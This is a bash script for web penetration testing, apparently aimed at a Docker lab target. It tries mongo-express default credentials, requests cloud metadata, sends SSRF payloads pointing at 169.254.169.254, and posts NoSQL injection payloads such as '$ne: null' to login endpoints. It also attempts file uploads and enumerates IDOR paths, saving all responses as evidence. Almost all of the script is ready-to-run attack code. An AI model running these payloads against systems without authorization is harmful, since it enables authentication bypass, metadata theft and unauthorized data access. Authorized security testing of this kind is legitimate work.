#!/usr/bin/env bash
set -euo pipefail
# targeted-checks.sh
# Run targeted checks (default creds, metadata, SSRF candidates, NoSQL test, file upload, IDOR enumeration)
# EDIT these variables as needed
TARGET_HOST="compose-nginx-1"
TARGET_BASE="https://${TARGET_HOST}"
OUTPUT_DIR="./evidence"
MONGO_USER="admin"
MONGO_PASS="pass"

mkdir -p "$OUTPUT_DIR"

echo "[*] Basic reachability"
docker exec -it zap curl -k -s -D "${OUTPUT_DIR}/index-headers.txt" "${TARGET_BASE}/" -o "${OUTPUT_DIR}/index-body.html" || true

echo "[*] Test mongo-express default creds"
curl -k -s -u "${MONGO_USER}:${MONGO_PASS}" -D "${OUTPUT_DIR}/mongo-auth-headers.txt" "${TARGET_BASE}/mongo-express/" -o "${OUTPUT_DIR}/mongo-express.html" || true

echo "[*] Check known metadata/cloud endpoint (direct)"
curl -k -s "${TARGET_BASE}/opc/v1/instance" -o "${OUTPUT_DIR}/cloud-metadata.txt" || true

# SSRF candidate paths - adjust according to discovered endpoints
SSRF_PATHS=(
  "/api/proxy"
  "/proxy"
  "/api/fetch"
)
SSRF_PAYLOAD='{"url":"http://169.254.169.254/latest/meta-data/"}'
for p in "${SSRF_PATHS[@]}"; do
  echo "[*] SSRF test ${p}"
  curl -k -s -X POST -H "Content-Type: application/json" -d "${SSRF_PAYLOAD}" "${TARGET_BASE}${p}" -o "${OUTPUT_DIR}/ssrf-$(echo ${p}|tr '/ ' '__').txt" || true
done

# NoSQL injection checks (JSON endpoints)
NOSQL_PATHS=(
  "/api/login"
  "/api/auth"
  "/api/users"
  "/api/search"
)
NOSQL_PAYLOADS=(
  '{"username":{"$ne":null},"password":"x"}'
  '{"username":{"$regex":"^"}}'
  '{"email":{"$exists":true}}'
)
for p in "${NOSQL_PATHS[@]}"; do
  for payload in "${NOSQL_PAYLOADS[@]}"; do
    echo "[*] NoSQL test POST ${p} -> payload ${payload}"
    curl -k -s -X POST -H "Content-Type: application/json" -d "${payload}" "${TARGET_BASE}${p}" -o "${OUTPUT_DIR}/nosql_$(echo ${p}|tr '/ ' '__')_$(echo ${payload}|md5sum | cut -d' ' -f1).txt" || true
  done
done

# File upload test - create a small temp file and try candidate upload endpoints
TMPFILE="$(mktemp /tmp/testfile.XXXX).txt"
echo "zap-filetest-$(date +%s)" > "$TMPFILE"
UPLOAD_PATHS=(
  "/upload"
  "/api/upload"
  "/files"
)
for p in "${UPLOAD_PATHS[@]}"; do
  echo "[*] Upload test ${p}"
  curl -k -s -X POST -F "file=@${TMPFILE}" "${TARGET_BASE}${p}" -D "${OUTPUT_DIR}/upload-${p//\//_}-headers.txt" -o "${OUTPUT_DIR}/upload-${p//\//_}-body.txt" || true
done
rm -f "$TMPFILE"

# IDOR / enumeration checks - example resource paths (change to actual discovered APIs)
IDOR_PATHS=(
  "/api/users"
  "/api/posts"
)
for p in "${IDOR_PATHS[@]}"; do
  for id in 1 2 3 4 5; do
    echo "[*] IDOR test GET ${p}/${id}"
    curl -k -s "${TARGET_BASE}${p}/${id}" -o "${OUTPUT_DIR}/idor_$(echo ${p}|tr '/ ' '__')_${id}.json" || true
  done
done

# Misc: grab headers like Server, CORS, CSP
echo "[*] Grab security headers sample"
curl -k -s -D "${OUTPUT_DIR}/headers-sample.txt" "${TARGET_BASE}/signin" -o "${OUTPUT_DIR}/signin.html" || true

echo "[*] Done. Evidence in ${OUTPUT_DIR}"
